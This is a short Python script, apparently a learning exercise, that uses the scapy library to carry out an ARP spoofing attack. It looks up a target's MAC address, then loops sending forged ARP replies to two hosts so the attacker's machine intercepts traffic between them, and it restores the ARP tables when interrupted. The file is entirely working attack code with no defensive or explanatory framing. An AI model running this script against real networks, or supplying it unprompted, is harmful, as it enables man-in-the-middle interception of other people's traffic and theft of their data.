import scapy.all as scapy

def arp_ask(target_ip):
    arp_request = scapy.ARP(pdst=target_ip)
    packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / arp_request
    answered, unanswered = scapy.srp(packet, timeout=2, verbose=True)
    return answered[0][1].hwsrc # return the MAC address of the target // answered[0][1] is the ARP response

def arp_spoof(target_ip, spoof_ip):
    target_mac = arp_ask(target_ip)
    arp_response = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op=2) # we are telling the target that we are spoof ip
    scapy.send(arp_response, verbose=False)
    
def arp_restore(target_ip, spoof_ip):
    target_mac = arp_ask(target_ip)
    spoof_mac = arp_ask(spoof_ip)
    arp_response = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac, op=2) # we are telling the target the real mac address of the spoof ip
    ether = scapy.Ether(dst=target_mac)
    packet = ether / arp_response
    scapy.send(packet, verbose=True)
    
def spoof(target_ip, spoof_ip):
    try:
        while True:
            arp_spoof(target_ip, spoof_ip)
            arp_spoof(spoof_ip, target_ip)
    except KeyboardInterrupt:
        print("Restoring ARP tables...")
        arp_restore(target_ip, spoof_ip)
        arp_restore(spoof_ip, target_ip)
        print("ARP tables restored.")
        return
    
spoof('','')
